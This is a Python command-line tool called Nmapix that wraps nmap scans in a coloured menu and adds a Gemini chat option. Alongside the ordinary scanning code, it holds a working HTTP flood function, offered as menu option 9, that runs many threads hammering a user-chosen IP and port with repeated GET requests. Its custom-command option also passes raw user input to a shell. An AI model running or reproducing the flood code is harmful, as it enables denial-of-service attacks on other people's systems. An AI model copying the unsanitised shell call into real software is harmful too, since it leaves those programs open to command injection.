#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import subprocess
import nmap
import socket
import threading
from colorama import Fore, Style, init

# Safe import for GenAI so the script never crashes on startup
try:
    from google import genai
    GENAI_AVAILABLE = True
except ImportError:
    GENAI_AVAILABLE = False

init(autoreset=True)

"""
========================================================================================
    Tool Name   : Python Nmap CLI Scanner (Nmapix)
    Author      : abhihack12
    Created On  : 2026
    Description : An advanced, automated command-line Python wrapper designed for 
                  streamlining network discovery, port scanning, and host enumeration 
                  using Nmap. Built for efficiency, automation, and ease of use in 
                  penetration testing and system administration workflows.

    Features Included:
        * Fast network discovery and ping sweeps
        * Comprehensive TCP/UDP port scanning (-sS, -sT, -sU, etc.)
        * OS and Service version detection (-sV, -O)
        * Interactive command-line menu interface
        * Clean and colorized output formatting using Colorama

    ------------------------------------------------------------------------------------
    DISCLAIMER & LEGAL NOTICE:
    This tool is developed strictly for educational purposes, authorized security 
    audits, and network administration. The author (abhihack12) will not be held 
    responsible for any misuse or illegal activities conducted using this software. 
    Users are strictly advised to obtain proper authorization before scanning any 
    networks or systems they do not own or have explicit permission to test.
    ------------------------------------------------------------------------------------

    LICENSE:
    MIT License

    Copyright (c) 2026 abhihack12

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to persons to whom the
    Software is furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
========================================================================================
"""

def start_banner():
    print(Fore.YELLOW + Style.BRIGHT + r"""
      o O ______________________
 _[]_|______________________N
|  O O O O      O O O O    \
+--(@)(@)------(@)(@)-------'
""")

# High-Power Flood Function
def start_power_flood(target, port, thread_count):
    packet_count = 0
    total_bytes = 0
    lock = threading.Lock()

    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        f"User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    payload_size = len(payload)

    def power_worker():
        nonlocal packet_count, total_bytes
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setblocking(False)
                
                try:
                    s.connect((target, port))
                except BlockingIOError:
                    pass
                
                for _ in range(40):
                    try:
                        s.sendall(payload)
                        with lock:
                            packet_count += 1
                            total_bytes += payload_size
                    except:
                        break
                s.close()
            except Exception:
                pass

    def stats_printer():
        while True:
            time.sleep(0.3)
            if total_bytes > 1024 * 1024:
                data_display = f"{total_bytes / (1024 * 1024):.2f} MB"
            else:
                data_display = f"{total_bytes / 1024:.2f} KB"
                
            sys.stdout.write(f"\r{Fore.GREEN}[Active] Packets: {packet_count} | Data Sent: {data_display}{Style.RESET_ALL}")
            sys.stdout.flush()

    print(f"\n{Fore.YELLOW}[!] Launching engine on {target}:{port} with {thread_count} threads...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Press Ctrl+C to stop and return to menu.{Style.RESET_ALL}\n")

    t_stat = threading.Thread(target=stats_printer)
    t_stat.daemon = True
    t_stat.start()

    threads_list = []
    for _ in range(thread_count):
        t = threading.Thread(target=power_worker)
        t.daemon = True
        t.start()
        threads_list.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Stopped. Total Packets: {packet_count} | Total Data Sent: {total_bytes / 1024:.2f} KB{Style.RESET_ALL}")
        return

start_banner()
print(Fore.BLUE + Style.BRIGHT + "Nmapix starting in 5 seconds please wait............") 
time.sleep(5)

# Safe KeyboardInterrupt handling for the entire script loop
try:
    while True:
        os.system("clear")
        
        print(Style.BRIGHT + Fore.RED + "=[ Python Nmap Security Framework (Nmapix) ]")
        print(Style.BRIGHT + Fore.YELLOW + "+ -- --=[ Version: 1.0.0-stable ]")
        print(Style.BRIGHT + Fore.YELLOW + "+ -- --=[ Author: abhihack12 ]\n")

        def banner_v1():
            print(Style.BRIGHT + Fore.CYAN + r"""       _.---._    /\\
    ./'       "--`\//
  ./              o \          .-----.
 /./\  )______   \__ \        (Nmapix)
./  / /\ \   | \ \  \ \       /`-----'
   / /  \ \  | |\ \  \7--- ooo ooo ooo ooo ooo ooo
""")
        banner_v1()

        print(Style.BRIGHT + Fore.GREEN + '[!] Startup Tip: "A scanner a day keeps bugs away."\n')
        print(Fore.GREEN + " [1] " + Fore.WHITE + "SYN Stealth Scan (-sS)") 
        print(Fore.GREEN + " [2] " + Fore.WHITE + "Service & Version Detection (-sV)")
        print(Fore.GREEN + " [3] " + Fore.WHITE + "OS Detection (-O)") 
        print(Fore.GREEN + " [4] " + Fore.WHITE + "UDP Port Scan (-sU) / Aggressive Scan (-A)")
        print(Fore.GREEN + " [5] " + Fore.WHITE + "Custom Command ")
        print(Fore.GREEN + " [6] " + Fore.WHITE + "Help / Guide")
        print(Fore.GREEN + " [7] " + Fore.WHITE + "Support / Contact")
        print(Fore.GREEN + " [8] " + Fore.WHITE + "Get AI help") 
        print(Fore.GREEN + " [9] " + Fore.WHITE + "Network Load / Flood Tool") 
        print(Fore.RED + " [0] " + Fore.WHITE + "Exit") 

        choice = input(Fore.BLUE + Style.DIM + " [+] Enter your input : ")

        if choice == '1':
            print(Fore.RED + r"""
               __      
         o-''-..._.l__.-'-
          (_(.-'    \--.
        """) 
            print(Fore.YELLOW + "\n[*] Selected: SYN Stealth Scan (-sS)")
            target_ip = input(Fore.GREEN + Style.BRIGHT + " [+] Enter target IP to scan: ")
            
            print(Fore.CYAN + f"\n[*] Running SYN Stealth Scan on {target_ip}...")
            print(Fore.YELLOW + "[*] Please wait, this might take a few moments...\n")
            
            try:
                nm = nmap.PortScanner()
                nm.scan(target_ip, arguments='-sS')
                
                for host in nm.all_hosts():
                    print(Fore.GREEN + f"\n[+] Host : {host} ({nm[host].hostname()})")
                    print(Fore.GREEN + f"[+] State : {nm[host].state()}")
                    
                    for proto in nm[host].all_protocols():
                        print(Fore.CYAN + f"\n--- Protocol : {proto} ---")
                        
                        ports = nm[host][proto].keys()
                        for port in sorted(ports):
                            state = nm[host][proto][port]['state']
                            service = nm[host][proto][port]['name']
                            print(Fore.WHITE + f"    Port: {port}\tState: {state}\tService: {service}")
                            
            except Exception as e:
                print(Fore.RED + f"[-] Error running scan: {e}")

        elif choice == '2':
            print(Fore.RED + r"""
               * ___  __._
         _________ /    \________
        [______________________]
         \oo      oo      oo  /
          ~~~~~~~~~~
        """) 
            print(Fore.YELLOW + "\n[*] Service & Version Detection selected...")
            target_ip = input(Fore.GREEN + Style.BRIGHT + " [+] Enter target IP to scan: ")
            try:
                nm = nmap.PortScanner()
                nm.scan(target_ip, arguments='-O -sV')
                
                for host in nm.all_hosts():
                    print(Fore.GREEN + f"\n[+] Host : {host} ({nm[host].hostname()})")
                    print(Fore.GREEN + f"[+] State : {nm[host].state()}")
                    
                    for proto in nm[host].all_protocols():
                        print(Fore.CYAN + f"\n--- Protocol : {proto} ---")
                        
                        ports = nm[host][proto].keys()
                        for port in sorted(ports):
                            state = nm[host][proto][port]['state']
                            service = nm[host][proto][port]['name']
                            print(Fore.WHITE + f"    Port: {port}\tState: {state}\tService: {service}")
                            
            except Exception as e:
                print(Fore.RED + f"[-] Error running scan: {e}")

        elif choice == '3':
            print(Fore.RED + r"""
                      /\
                 /  \
                / /\ \
               / /  \ \
              / /    \ \
         ____/ /      \ \____
        |___________________|
              \ \    / /
               \ \  / /
        """)
            print(Fore.YELLOW + "\n[*] OS Detection selected...")
            target_ip = input(Fore.GREEN + Style.BRIGHT + " [+] Enter target IP to scan: ")
            try:
                nm = nmap.PortScanner()
                nm.scan(target_ip, arguments='-O')
                
                for host in nm.all_hosts():
                    print(Fore.GREEN + f"\n[+] Host : {host} ({nm[host].hostname()})")
                    print(Fore.GREEN + f"[+] State : {nm[host].state()}")
                    
                    for proto in nm[host].all_protocols():
                        print(Fore.CYAN + f"\n--- Protocol : {proto} ---")
                        
                        ports = nm[host][proto].keys()
                        for port in sorted(ports):
                            state = nm[host][proto][port]['state']
                            service = nm[host][proto][port]['name']
                            print(Fore.WHITE + f"    Port: {port}\tState: {state}\tService: {service}")
                            
            except Exception as e:
                print(Fore.RED + f"[-] Error running scan: {e}")

        elif choice == '4':
            print(Fore.GREEN + r"""
                  __
             |  |
           __v  v__
          /   __   \
         ____/___|  |___\____
        /____________________\
             / /      \ \
        """)
            print(Fore.YELLOW + "\n[*] UDP Port Scan selected...")
            target_ip = input(Fore.GREEN + Style.BRIGHT + " [+] Enter target IP to scan: ")
            try:
                nm = nmap.PortScanner()
                nm.scan(target_ip, arguments='-sU')
                
                for host in nm.all_hosts():
                    print(Fore.GREEN + f"\n[+] Host : {host} ({nm[host].hostname()})")
                    print(Fore.GREEN + f"[+] State : {nm[host].state()}")
                    
                    for proto in nm[host].all_protocols():
                        print(Fore.CYAN + f"\n--- Protocol : {proto} ---")
                        
                        ports = nm[host][proto].keys()
                        for port in sorted(ports):
                            state = nm[host][proto][port]['state']
                            service = nm[host][proto][port]['name']
                            print(Fore.WHITE + f"    Port: {port}\tState: {state}\tService: {service}")
                            
            except Exception as e:
                print(Fore.RED + f"[-] Error running scan: {e}")

        elif choice == '5':
            print(Fore.CYAN + r"""
                     |
                _|_
              __|___|__
             /         \
        ~~~~~~~~~~~~~~~~~~~~~~~~
        """) 
            print(Fore.YELLOW + "\n[*] Custom Command selected...")
            target_ip = input(Fore.GREEN + Style.BRIGHT + " [+] Enter target IP to scan: ")
            custom = input("Enter flags : ") 
            subprocess.run("nmap " + target_ip + " " + custom, shell=True) 

        elif choice == '6':
            print(Fore.CYAN + "\n" + "="*50)
            print(Fore.GREEN + " [?] Nmapix Help & Guide:")
            print(Fore.WHITE + "  - Options [1] to [4] are automated vulnerability & port scans.")
            print(Fore.WHITE + "  - Option [5] allows you to write your own custom Nmap flags.")
            print(Fore.WHITE + "  - Legal Notice: Use only for authorized security testing.")
            print(Fore.CYAN + "="*50 + "\n")

        elif choice == '7':
            print(Fore.CYAN + "\n" + "="*50)
            print(Fore.YELLOW + " [!] Support & Contact Info:")
            print(Fore.WHITE + "  - Tool Name   : Nmapix (Python Nmap CLI Wrapper)")
            print(Fore.WHITE + "  - Author      : abhihack12")
            print(Fore.WHITE + "  - Version     : 1.0.0-stable (2026)")
            print(Fore.WHITE + "  - Community   : Built for Linux & Termux enthusiasts.")
            print(Fore.CYAN + "="*50 + "\n")

        elif choice == '8':
            if not GENAI_AVAILABLE:
                print(Fore.RED + "[-] Error: 'google-genai' library failed to load.")
            else:
                print(Fore.CYAN + "\n" + "="*50)
                print(Fore.MAGENTA + " [🤖] AI Help & Assistant Support:")
                print(Fore.WHITE + "  - Integrated with Exam Helper AI concepts.")
                print(Fore.WHITE + "  - Purpose     : Assisting developers & learners with CLI commands.")
                print(Fore.WHITE + "  - Tip         : If you face any syntax or network error, consult your AI partner.")
                print(Fore.CYAN + r"""  
                  [=======]
                   |     |
                  _|_____|_
                 / |     | \
                /  |     |  \
               |___|_____|___|
                 | |     | |
                 |_|     |_|
                ( _ )   ( _ )
            """) 
                print(Fore.CYAN + "\n" + "="*50)
                print(Fore.MAGENTA + " [🤖] Nmapix Gemini AI Assistant Integration:")
                print(Fore.WHITE + "  - Load API Key via custom file path.")
                print(Fore.CYAN + "="*50 + "\n")
                
                try:
                    key_path = input(Fore.GREEN + " [+] Enter path to your API key file (e.g., /sdcard/key.txt): ").strip()
                    
                    if not os.path.exists(key_path):
                        print(Fore.RED + f"[-] Error: File not found at '{key_path}'!")
                    else:
                        with open(key_path, "r", encoding="utf-8") as f:
                            user_api_key = f.read().strip()
                            
                        if not user_api_key:
                            print(Fore.RED + "[-] The specified file is empty! Please put your API key inside the file.")
                        else:
                            client = genai.Client(api_key=user_api_key)
                            print(Fore.YELLOW + "\n[*] API Key loaded successfully from path! Type your prompt below (type 'exit' to quit).\n")
                            
                            while True:
                                user_prompt = input(Fore.CYAN + " Ask AI ➜ ")
                                if user_prompt.lower() == 'exit':
                                    print(Fore.YELLOW + "[*] Exiting AI Assistant...")
                                    break
                                
                                if not user_prompt.strip():
                                    continue
                                
                                print(Fore.YELLOW + "[*] Generating response...")
                                
                                try:
                                    response = client.models.generate_content(
                                        model='gemini-2.5-flash',
                                        contents=user_prompt,
                                    )
                                    print(Fore.GREEN + "\n[Gemini AI Answer]:\n" + Fore.WHITE + response.text + "\n")
                                except Exception as api_err:
                                    print(Fore.RED + f"[-] API Error: {api_err}")
                                    
                except Exception as e:
                    print(Fore.RED + f"[-] An error occurred: {e}")

        elif choice == '9':
            print(Fore.CYAN + r"""
                     |
                _|_
              __|___|__
             /         \
        ~~~~~~~~~~~~~~~~~~~~~~~~
        """)
            print(Fore.YELLOW + "\n[*] Network Load / Flood Tool selected...")
            try:
                t_ip = input(Fore.GREEN + Style.BRIGHT + " [+] Enter target IP: ")
                t_port = int(input(Fore.GREEN + Style.BRIGHT + " [+] Enter target Port: "))
                t_threads = int(input(Fore.GREEN + Style.BRIGHT + " [+] Enter Thread Count: "))
                
                start_power_flood(t_ip, t_port, t_threads)
            except ValueError:
                print(Fore.RED + "[-] Invalid input! Please enter numbers for port and threads.")

        elif choice == '0':
            print(Fore.MAGENTA + "\nExiting... thanks for using Nmapix.") 
            break

        else:
            print(Fore.RED + "[-] Invalid Choice! Please select between 0 to 9.")

        input(Fore.YELLOW + "\n[Press Enter to return to main menu...]")

except KeyboardInterrupt:
    print(Fore.MAGENTA + "\n\n[!] Program interrupted by user (Ctrl+C). Exiting safely... Goodbye! 🚀" + Style.RESET_ALL)
    sys.exit(0)
